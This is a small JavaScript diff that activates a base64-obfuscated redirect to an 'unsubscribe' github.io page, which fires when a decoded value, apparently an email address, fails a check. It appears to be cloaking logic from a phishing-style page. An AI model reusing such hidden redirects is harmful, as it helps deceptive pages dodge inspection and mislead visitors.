@@ -89,8 +89,7 @@ function getRandomString(length) {
             Boxx = decString;
         } else {
           setTimeout(function() {
-            console.log('ERROR AT STAGE 3 Y..what triggered');
-            //window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
+            window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
         }, 500);
         }
         var eml = Boxx;
